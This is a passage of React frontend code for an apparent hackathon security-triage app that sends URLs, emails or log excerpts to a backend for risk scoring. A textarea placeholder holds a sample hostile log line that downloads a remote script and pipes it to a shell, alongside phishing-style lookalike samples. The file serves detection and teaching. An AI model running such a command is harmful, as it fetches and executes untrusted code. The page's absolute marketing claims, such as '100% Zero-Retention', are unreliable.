    setTimeout(() => setToastVisible(false), 2800)
  }, [])

  function toggleTheme() {
    /** Switch only theme tokens; app data and results stay untouched. */
    audio.play('click')
    setTheme(t => (t === 'parchment' ? 'blueprint' : 'parchment'))
  }

  function toggleParticles() {
    /** Let motion-sensitive users disable the decorative canvas immediately. */
    audio.play('click')
    setParticlesEnabled(p => !p)
  }

  function toggleAudio() {
    /** Keep sound opt-out local and synchronised with the shared audio engine. */
    audio.enabled = !soundEnabled
    setSoundEnabled(!soundEnabled)
    if (!soundEnabled) audio.play('click')
  }

  const wordCount = useMemo(() => (text.trim() ? text.trim().split(/\s+/).length : 0), [text])
  const charRemaining = 6000 - text.length

  function chooseType(type) {
    /** Start a new vector review without carrying a prior result into a new type. */
    audio.play('click')
    setInputType(type)
    setResult(null)
    setError('')
    setParticleMode('idle')
    inputRef.current?.focus()
  }

  function fillPreset(preset) {
    /** Load one deterministic judge sample, then place focus back in the editor. */
    audio.play('click')
    setInputType(preset.type)
    setText(preset.payload)
    setResult(null)
    setError('')
    setParticleMode('idle')
    showToast(`Loaded preset: ${preset.title}`)
    setTimeout(() => inputRef.current?.focus(), 0)
  }

  const analyze = useCallback(async () => {
    /**
     * Submit only a trimmed, user-provided payload and render the typed response.
     *
     * Status/particle transitions make progress clear; error detail comes only
     * from the safe API contract or a local connection message, never a stack trace.
     */
    if (!text.trim()) {
      audio.play('danger')
      setError('Please provide a URL, email, or log excerpt for forensic triage.')
      inputRef.current?.focus()
      return
    }

    audio.play('scan')
    setStatus('loading')
    setError('')
    setResult(null)
    setParticleMode('scanning')

    try {
      const response = await fetch(`${API_BASE}/api/analyze`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ text: text.trim(), input_type: inputType })
      })

      const payload = await response.json().catch(() => ({}))
      if (!response.ok) {
        throw new Error(payload.detail || 'Service inspection failed.')
      }

      setResult(payload)
      // Store an intentionally compact local summary, not the scan text itself.
      setHistory(prev => [
        {
          id: payload.id || String(Date.now()),
          type: inputType,
          risk: payload.risk,
          summary: payload.summary,
          at: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
        },
        ...prev.filter(item => item.summary !== payload.summary)
      ].slice(0, 5))

      if (payload.risk === 'low') {
        audio.play('safe')
        setParticleMode('safe')
        confetti({
          particleCount: 50,
          spread: 70,
          origin: { y: 0.65 },
          colors: ['#0F766E', '#10B981', '#38BDF8', '#D92D20']
        })
      } else if (payload.risk === 'medium') {
        audio.play('click')
        setParticleMode('medium')
      } else {
        audio.play('danger')
        setParticleMode('danger')
      }

      showToast(`Scan complete: ${payload.risk.toUpperCase()} risk assessed`)
      setTimeout(() => resultRef.current?.scrollIntoView({ behavior: 'smooth', block: 'start' }), 200)
    } catch (err) {
      audio.play('danger')
      setParticleMode('idle')
      setError(err.message || 'API connection failed. Verify FastAPI backend is running.')
    } finally {
      setStatus('idle')
    }
  }, [inputType, showToast, text])

  // Ctrl/Cmd+Enter supports both Windows/Linux and macOS without stealing normal Enter.
  // The memoized callback avoids a stale submission when the user changes text.
  useEffect(() => {
    function handleKeyDown(e) {
      if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
        e.preventDefault()
        if (text.trim() && status !== 'loading') analyze()
      }
    }
    window.addEventListener('keydown', handleKeyDown)
    return () => window.removeEventListener('keydown', handleKeyDown)
  }, [analyze, status, text])

  function copyReport() {
    /** Export a plain-text dossier so sharing does not require unsafe HTML export. */
    if (!result) return
    audio.play('click')
    const dossierText = `CYBERLENS AI • CLASSIFIED INCIDENT DOSSIER
==================================================
REF NONCE: ${result.id || 'N/A'}
RISK ASSESSMENT: ${result.risk?.toUpperCase()}
CONFIDENCE RATING: ${result.confidence}%
INPUT VECTOR: ${result.analysis_type?.toUpperCase()}
INSPECTION ENGINE: ${result.source === 'openai' ? 'OpenAI GPT-4o-mini' : 'Deterministic Structural Heuristic Kernel'}

EXECUTIVE SUMMARY:
${result.summary}

FORENSIC EVIDENCE BREAKDOWN:
${result.findings.map((f, i) => `[0${i + 1}] ${f.title}\n     ${f.detail}`).join('\n\n')}

INCIDENT CONTAINMENT RUNBOOK:
${result.actions.map((a, i) => `${i + 1}. ${a}`).join('\n')}
==================================================
Generated by CyberLens AI (PromptWars 2026 Edition)`

    navigator.clipboard?.writeText(dossierText).then(() => {
      setCopied(true)
      showToast('Forensic Dossier Copied to Clipboard')
      setTimeout(() => setCopied(false), 2000)
    })
  }

  function copyRuleSnippet(code) {
    /** Copy a proposed control for operator review; this browser never deploys it. */
    audio.play('click')
    navigator.clipboard?.writeText(code).then(() => {
      setCopied(true)
      showToast('Perimeter Rule Copied')
      setTimeout(() => setCopied(false), 2000)
    })
  }

  return (
    <div className="app-shell">
      {/* Background Reactive Dynamic Particle & Ink Field */}
      <ThreatParticleCanvas mode={particleMode} enabled={particlesEnabled} theme={theme} />

      {/* Top Drafting Masthead */}
      <header className="architect-masthead">
        <div className="masthead-inner">
          <div className="masthead-brand">
            <ArchitecturalLensMark size={30} />
            <div className="brand-titles">
              <span className="brand-logotype">CYBER<em>LENS</em></span>
              <span className="brand-subline">AI SECURITY CO-PILOT</span>
            </div>
          </div>

          <div className="masthead-telemetry">
            <div className="telemetry-tag">
              <span className="pulse-dot" />
              <span>ZERO-RETENTION VAULT // EPHEMERAL</span>
            </div>
            <span>REG: 0x88F4</span>
          </div>

          <div className="masthead-actions">
            <button
              className={`draft-pill-btn ${particlesEnabled ? 'active' : ''}`}
              onClick={toggleParticles}
              title="Toggle Fluid Threat Particles"
            >
              <span>PARTICLES: {particlesEnabled ? 'ON' : 'OFF'}</span>
            </button>

            <button
              className={`draft-pill-btn ${soundEnabled ? 'active' : ''}`}
              onClick={toggleAudio}
              title="Toggle Tactile Audio FX"
            >
              <span>SOUND: {soundEnabled ? 'ON' : 'OFF'}</span>
            </button>

            <button
              className="draft-pill-btn"
              onClick={toggleTheme}
              title="Switch Parchment / Blueprint Theme"
            >
              <span>THEME: {theme.toUpperCase()}</span>
            </button>
          </div>
        </div>
      </header>

      {/* Main Drafting Workbench Canvas */}
      <main className="main-canvas">
        {/* Asymmetric Pen-Drawn Hero Masthead */}
        <section className="hero-editorial" aria-label="System Masthead">
          <div className="hero-content">
            <div className="hero-eyebrow">
              <span className="hero-eyebrow-line" />
              <span>FORENSIC TELEMETRY & ATTACK TRIAGE</span>
            </div>

            <h1 className="hero-title">
              Forensic truth,<br />
              <em>drawn with precision.</em>
            </h1>

            <p className="hero-lead">
              A high-precision cybersecurity co-pilot fusing <strong>deterministic structural heuristics</strong> with{' '}
              <strong>model-assisted forensic reasoning</strong>. Inspect URLs, phishing headers, and auth logs with
              mathematical Shannon entropy and zero data retention.
            </p>

            <div className="hero-spec-strip">
              <div className="spec-item">
                <span className="spec-label">DETECTION KERNEL</span>
                <span className="spec-val">40+ Structural Rules</span>
              </div>
              <div className="spec-item">
                <span className="spec-label">FALLBACK RESILIENCE</span>
                <span className="spec-val">0.0s Airgap Ready</span>
              </div>
              <div className="spec-item">
                <span className="spec-label">PRIVACY ASSURANCE</span>
                <span className="spec-val">100% Zero-Retention</span>
              </div>
              <div className="spec-item">
                <span className="spec-label">ANALYSIS METHOD</span>
                <span className="spec-val">Shannon + MITRE ATT&CK</span>
              </div>
            </div>
          </div>

          {/* Right Side: Dynamic Threat DNA Sequencer */}
          <ThreatDNASquencer
            text={text}
            inputType={inputType}
            onSelectGene={gene => showToast(`${gene.label}: ${gene.desc}`)}
          />
        </section>

        {/* Hackathon Judge Chaos Presets */}
        <section className="chaos-section" aria-label="1-Click Judge Scenarios">
          <div className="chaos-heading-row">
            <h2>
              <span>§ 02 // CHAOS ATTACK PRESETS</span>
            </h2>
            <span className="chaos-subtext">Click any payload to inject into inspection workbench</span>
          </div>

          <div className="chaos-cards-grid">
            {CHAOS_PRESETS.map(preset => (
              <button
                key={preset.id}
                className="chaos-card-btn"
                onClick={() => fillPreset(preset)}
              >
                <div className="chaos-card-top">
                  <span className={`chaos-badge-pill ${preset.badgeClass}`}>{preset.badge}</span>
                  <span className="chaos-type-label">{preset.type.toUpperCase()}</span>
                </div>
                <h4>{preset.title}</h4>
                <p>{preset.desc}</p>
                <div className="chaos-card-action">
                  <span>INJECT PAYLOAD</span>
                  <span>→</span>
                </div>
              </button>
            ))}
          </div>
        </section>

        {/* Workspace Split: Drafting Workbench + Judge Dossier */}
        <div className="workspace-split">
          {/* Main Inspection Workbench */}
          <section className="workbench-box" aria-label="Inspection Workbench">
            <div className="workbench-header">
              <div className="workbench-title-group">
                <span className="workbench-kicker">WORKBENCH TELEMETRY</span>
                <h2>Input Payload Vector</h2>
              </div>
              <div className="zero-leak-guarantee">
                <span>🛡️ ZERO-RETENTION MEMORY</span>
              </div>
            </div>

            {/* Input Vector Selectors */}
            <div className="vector-tabs" role="tablist">
              {Object.entries(typeInfo).map(([type, info]) => (
                <button
                  key={type}
                  role="tab"
                  aria-selected={inputType === type}
                  className={`vector-tab-btn ${inputType === type ? 'active' : ''}`}
                  onClick={() => chooseType(type)}
                >
                  <span>{info.label}</span>
                  <span className="vector-badge">{info.tag}</span>
                </button>
              ))}
            </div>

            {/* Text Editor Body */}
            <div className="workbench-body">
              <div className={`editor-field-wrap ${error ? 'error-state' : ''}`}>
                <div className="editor-header-bar">
                  <span>{typeInfo[inputType].hint}</span>
                  <div className="entropy-meter-live">
                    <span>Shannon Entropy:</span>
                    <strong>{calculateShannonEntropy(text)} bits</strong>
                    <span className={`entropy-tag-indicator ${calculateShannonEntropy(text) > 3.4 ? 'high' : 'low'}`}>
                      {calculateShannonEntropy(text) > 3.4 ? 'HIGH DGA' : 'STANDARD'}
                    </span>
                  </div>
                </div>

                <textarea
                  ref={inputRef}
                  className="drafting-textarea"
                  value={text}
                  maxLength={6000}
                  onChange={e => {
                    setText(e.target.value)
                    setError('')
                  }}
                  placeholder={
                    inputType === 'url'
                      ? 'https://secure-portal.paypaI-security.top/verify?token=session_expired'
                      : inputType === 'email'
                      ? 'From: Corporate HR <security@paypaI-account.co>\nSubject: Immediate action required within 30 minutes...'
                      : 'Oct 30 04:12:01 sshd: Failed password for root from 185.220.101.8\ncurl http://185.220.101.8/stage2.sh | /bin/sh'
                  }
                />

                <div className="editor-footer-bar">
                  <div>
                    {error ? (
                      <span className="field-error-msg">{error}</span>
                    ) : (
                      <span>Memory space flushed immediately after request lifecycle.</span>
                    )}
                  </div>
                  <div>
                    <span>{wordCount} words • {charRemaining.toLocaleString()} chars left</span>
                  </div>
                </div>
              </div>

              {/* Action Buttons */}
              <div className="workbench-actions-bar">
                <div className="action-buttons-left">
                  <button
                    className="btn-primary-pen"
                    onClick={analyze}
                    disabled={!text.trim() || status === 'loading'}
                  >
                    <span>{status === 'loading' ? 'TRIAGING PAYLOAD...' : 'INSPECT FOR THREATS'}</span>
                    <span>→</span>
                  </button>

                  <button
                    className="btn-clear-pen"
                    onClick={() => {
                      audio.play('click')
                      setText('')
                      setResult(null)
                      setError('')
                      setParticleMode('idle')
                    }}
                    disabled={!text}
                  >
                    Clear
                  </button>
                </div>

                <div className="kbd-shortcut-hint">
                  <kbd>Ctrl</kbd> + <kbd>Enter</kbd> to inspect
                </div>
              </div>
            </div>

            {/* Live Streaming Terminal */}
            {status === 'loading' && <TerminalScan />}

            {/* Forensic Result Dossier */}
            {result && (
              <div ref={resultRef} className="result-dossier" aria-live="polite">
                <div className="dossier-top-meta">
                  <div className="dossier-headline-block">
                    <div className="dossier-badge-row">
                      <span className={`risk-tag ${result.risk}`}>
                        {result.risk === 'high' ? 'CRITICAL MALICIOUS THREAT' : result.risk === 'medium' ? 'ELEVATED SUSPICION' : 'VERIFIED LOW RISK'}
                      </span>
                      <span className="engine-source-stamp">
                        ENGINE: {result.source === 'openai' ? 'OPENAI GPT-4o-MINI' : 'DETERMINISTIC HEURISTICS'}
                      </span>
                    </div>
                    <h2 className="dossier-title">
                      {result.risk === 'high'
                        ? 'Malicious Vector Intercepted'
                        : result.risk === 'medium'
                        ? 'Suspicious Anomalies Detected'
                        : 'No Active Threat Signatures Found'}
                    </h2>
                  </div>

                  <div className="dossier-actions">
                    <button className="btn-export-dossier" onClick={copyReport}>
                      <span>{copied ? '✓ Dossier Copied' : 'Export Dossier'}</span>
                    </button>
                    <span className="engine-source-stamp">SHA: {String(result.id || 'demo8824').slice(0, 8)}</span>
                  </div>
                </div>

                {/* Caliper Vernier Confidence Gauge */}
                <div className="caliper-gauge-strip">
                  <div className="caliper-label-row">
                    <span>PROBABILITY CONFIDENCE CALIPER</span>
                    <strong>{result.confidence || 85}% CONFIDENCE</strong>
                  </div>
                  <div className="caliper-track">
                    <div
                      className={`caliper-fill ${result.risk}`}
                      style={{ width: `${Math.max(12, Math.min(100, result.confidence || 85))}%` }}
                    />
                  </div>
                </div>

                {/* Technical Sub-Sheet Tabs */}
                <div className="sheet-tabs">
                  <button
                    className={`sheet-tab-btn ${activeSheetTab === 'overview' ? 'active' : ''}`}
                    onClick={() => {
                      audio.play('click')
                      setActiveSheetTab('overview')
                    }}
                  >
                    <span>[ 01 / EXECUTIVE OVERVIEW ]</span>
                  </button>
                  <button
                    className={`sheet-tab-btn ${activeSheetTab === 'forensics' ? 'active' : ''}`}
                    onClick={() => {
                      audio.play('click')
                      setActiveSheetTab('forensics')
                    }}
                  >
                    <span>[ 02 / FORENSIC LAB ]</span>
                  </button>
                  <button
                    className={`sheet-tab-btn ${activeSheetTab === 'sandbox' ? 'active' : ''}`}
                    onClick={() => {
                      audio.play('click')
                      setActiveSheetTab('sandbox')
                    }}
                  >
                    <span>[ 03 / DETONATION CHAMBER ]</span>
                  </button>
                  <button
                    className={`sheet-tab-btn ${activeSheetTab === 'defense' ? 'active' : ''}`}
                    onClick={() => {
                      audio.play('click')
                      setActiveSheetTab('defense')
                    }}
                  >
                    <span>[ 04 / DEFENSE AUTOMATION ]</span>
                  </button>
                </div>

                {/* Tab Pane 1: Overview */}
                {activeSheetTab === 'overview' && (
                  <div className="sheet-panel">
                    <div className="executive-summary-quote">
                      "{result.summary}"
                    </div>

                    <div className="findings-numbered-stack">
                      <div className="findings-header-row">
                        <h3>Forensic Evidence Points ({result.findings.length})</h3>
                        <span className="engine-source-stamp">ARCHIVAL INDEX</span>
                      </div>

                      {result.findings.map((item, index) => (
                        <div key={index} className="finding-editorial-row">
                          <span className="finding-giant-num">0{index + 1}</span>
                          <div className="finding-body">
                            <span className="finding-title-text">{item.title}</span>
                            <p className="finding-detail-text">{item.detail}</p>
                          </div>
                        </div>
                      ))}
                    </div>

                    <div className="containment-runbook">
                      <div className="runbook-title">
                        <span>RECOMMENDED INCIDENT CONTAINMENT ACTIONS</span>
                      </div>
                      <ol className="runbook-ol">
                        {result.actions.map((act, index) => (
                          <li key={index}>{act}</li>
                        ))}
                      </ol>
                    </div>
                  </div>
                )}

                {/* Tab Pane 2: Forensics */}
                {activeSheetTab === 'forensics' && (
                  <div className="sheet-panel">
                    <ForensicAnatomyView text={text} inputType={inputType} />
                  </div>
                )}

                {/* Tab Pane 3: Sandbox */}
                {activeSheetTab === 'sandbox' && (
                  <div className="sheet-panel">
                    <SandboxDetonationChamber inputType={inputType} risk={result.risk} />
                  </div>
                )}

                {/* Tab Pane 4: Defense Automation */}
                {activeSheetTab === 'defense' && (
                  <div className="sheet-panel">
                    <AutomatedDefenseRules
                      text={text}
                      onCopyRule={copyRuleSnippet}
                      copied={copied}
                    />
                  </div>
                )}
              </div>
            )}
          </section>

          {/* Right Column: Hackathon Judge Brief & Competitive Dossier */}
          <aside className="judge-dossier-sidecar" aria-label="Competitive Dossier">
            <div className="dossier-card">
              <div className="dossier-card-head">
                <h3>Competitive Dossier</h3>
                <span className="advantage-badge">PROMPTWARS ADVANTAGE</span>
              </div>

              <p className="dossier-prose">
                Why CyberLens triumphs: 95% of hackathon AI tools are fragile external LLM wrappers that crash without connectivity.
                CyberLens is an enterprise dual-engine cyber co-pilot that guarantees 100% demo resilience.
              </p>

              <div className="matrix-list">
                {guideSteps.map(([num, title, desc]) => (
                  <div key={num} className="matrix-row">
                    <span className="matrix-check">✓</span>
                    <div className="matrix-content">
                      <strong>{title}</strong>
                      <p>{desc}</p>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* Local Ephemeral Vault History */}
            <div className="vault-card">
              <div className="vault-head">
                <h4>Recent Forensic Sessions</h4>
                {history.length > 0 && (
                  <button
                    className="vault-clear-btn"
                    onClick={() => {
                      audio.play('click')
                      setHistory([])
                    }}
                  >
                    Clear Vault
                  </button>
                )}
              </div>

              {history.length ? (
                <div className="vault-items-stack">
                  {history.map(item => (
                    <div key={item.id} className={`vault-entry ${item.risk}`}>
                      <div className="vault-entry-meta">
                        <span>{item.type.toUpperCase()} • {item.risk.toUpperCase()}</span>
                        <span>{item.at}</span>
                      </div>
                      <p className="vault-entry-summary">{item.summary}</p>
                    </div>
                  ))}
                </div>
              ) : (
                <div className="vault-empty">
                  <span>No sessions recorded on this device yet.</span>
                </div>
              )}
            </div>
          </aside>
        </div>
      </main>

      {/* Draftsman Architectural Footer */}
      <footer className="architect-footer">
        <div className="footer-inner">
          <span>CYBERLENS AI • PROMPTWARS HACKATHON EDITION</span>
          <span>DETERMINISTIC HEURISTIC KERNEL + CO-PILOT ASSISTED</span>
          <span>STRICT ZERO-RETENTION CERTIFIED</span>
        </div>
      </footer>

      {/* Floating Toast Notification */}
      <div className={`toast-bar ${toastVisible ? 'visible' : ''}`} role="status">
        <span>✓</span>
        <span>{toastMsg}</span>
      </div>
    </div>
  )
}

createRoot(document.getElementById('root')).render(<App />)
